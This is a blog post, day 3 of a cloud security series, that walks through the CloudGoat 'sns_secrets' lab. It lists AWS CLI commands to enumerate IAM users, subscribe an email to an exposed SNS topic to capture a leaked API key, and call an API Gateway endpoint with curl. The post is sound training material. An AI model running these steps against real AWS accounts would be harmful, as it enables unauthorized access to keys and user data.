---
title: '100 Days of Cloud Security - Day 3: Cloud Security Journey'
date: '2025-11-12'
author: 'Venkata Pathuri'
excerpt: 'Day 3 of my cloud security journey - Cloud Security Journey'
tags: ['cloud-security', 'aws', '100days', 'cybersecurity']
---

# Day 3: Cloud Security Journey

## Overview
Welcome back to Day 3 of our cloud security adventure! Today, we’re diving into a hands-on exercise that not only enhances our understanding of AWS services but also sharpens our skills in identifying and exploiting vulnerabilities within cloud environments. Building on the foundational knowledge we acquired on Day 2 regarding identity and access management, we will explore how misconfigurations can lead to serious security risks—specifically focusing on the AWS services SNS (Simple Notification Service) and API Gateway.

## Learning Objectives
By the end of today’s session, you will master the deployment and exploitation of the CloudGoat scenario `sns_secrets`. You’ll gain practical experience in enumerating AWS resources, understanding IAM policies, and leveraging SNS for message delivery. This exercise will empower you to identify vulnerabilities that could lead to unauthorized access and demonstrate the critical importance of secure cloud configurations. Let’s get ready to elevate our cloud security skills!

## Deep Dive
### Understanding SNS (Simple Notification Service)
SNS is a powerful pub/sub messaging service that allows applications to send notifications to subscribers via various protocols—be it HTTP(S), SMS, or email. In our scenario today, we will see how sensitive information can be exposed through improperly managed subscriptions.

Consider this real-world situation: a company unintentionally exposes its API keys through an SNS topic that is improperly secured. An attacker could subscribe to this topic and receive critical information, leading to unauthorized access to APIs and sensitive data.

### API Gateway Essentials
API Gateway acts as a bridge between clients and your backend services, efficiently managing all API calls. It organizes APIs into stages, resources, and methods. However, care must be taken to secure these APIs, as misconfigured permissions can lead to data breaches.

To visualize, imagine you have a stage called `prod` containing a resource path `/user-data`. If not secured properly, anyone with the right API key can access sensitive user data, posing a significant risk.

### The Attack Scenario
In our `sns_secrets` scenario:
1. We started by listing IAM users, identifying `cg-sns-user-cgid4osa6lp4g4`.
2. Upon examining the policies associated with this user, we discovered a mix of allowed actions and explicit denials, particularly regarding API Gateway access.
3. The key step was to subscribe an email endpoint to our identified SNS topic to capture the leaked API key.

This process exemplifies a common pitfall: overly permissive IAM policies coupled with improper SNS configurations can lead to severe security vulnerabilities.

### Current Best Practices
1. **Least Privilege Principle:** Ensure that IAM users have the minimum permissions necessary to perform their tasks.
2. **Secure SNS Topics:** Always authenticate subscribers and ensure that sensitive messages are not sent to insecure endpoints.
3. **Regular Audits:** Conduct frequent audits of IAM policies and SNS configurations to identify and remediate potential vulnerabilities.

## Hands-On Practice
Let’s put theory into practice by following these steps:

1. **Set Up Your Environment:**
   - Ensure your AWS credentials are configured in your isolated lab account (profile name: `100days`).
   - Deploy the `sns_secrets` scenario using CloudGoat.

2. **Execute Commands:**
   - List IAM users:
     ```bash
     aws iam list-users --profile 100days
     ```
   - View associated policies:
     ```bash
     aws iam list-user-policies --user-name cg-sns-user-cgid4osa6lp4g4 --profile 100days
     ```
   - Subscribe to the SNS topic:
     ```bash
     aws sns subscribe \
       --topic-arn "arn:aws:sns:us-east-1:997581282912:public-topic-cgid4osa6lp4g4" \
       --protocol email \
       --notification-endpoint your_email@example.com \
       --profile 100days \
       --region us-east-1
     ```
   - Confirm your subscription via the email received.

3. **Retrieve the API Key:**
   After confirming the subscription, check your email for the API key notification, then enumerate the API Gateway resources:
   ```bash
   aws apigateway get-rest-apis --profile 100days
   ```
   Use the API key to invoke the API Gateway endpoint:
   ```bash
   curl -H "x-api-key: <leaked_api_key>" https://8bbc1yduf8.execute-api.us-east-1.amazonaws.com/prod-cgid4osa6lp4g4/user-data
   ```

4. **Verify Success:**
   You should receive the final flag if the API call is successful.

### Common Troubleshooting Tips
- Ensure that you have confirmed your SNS subscription; otherwise, you’ll miss the API key.
- Double-check IAM permissions if you face access issues while listing resources or invoking the API.

## Key Takeaways
In today's exercise, we learned how improperly configured IAM policies and SNS subscriptions can lead to the exposure of sensitive information, such as API keys. By actively engaging in the attack scenario, you now understand the potential risks associated with AWS services and the importance of implementing security best practices. Remember, in the world of cloud security, vigilance is key!

## Real-World Applications
In production environments, organizations must continually assess their cloud configurations. For instance, a financial institution may face severe repercussions if sensitive information is leaked due to misconfigured SNS topics. By applying the lessons learned today, you can help ensure that your organization maintains a strong security posture while leveraging the full power of cloud services.

---
**Journey Progress:** 3/100 Days Complete 🚀